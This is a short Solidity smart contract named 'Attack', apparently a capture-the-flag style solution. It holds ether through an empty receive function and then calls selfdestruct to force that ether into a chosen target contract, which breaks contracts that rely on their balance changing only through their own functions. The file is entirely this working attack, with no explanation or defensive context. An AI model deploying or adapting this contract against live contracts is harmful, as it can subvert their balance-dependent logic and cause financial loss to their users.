// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;
contract Attack {

    function attack(address payable _target) public{
        selfdestruct(_target);
    }

    receive() payable external{

    }

}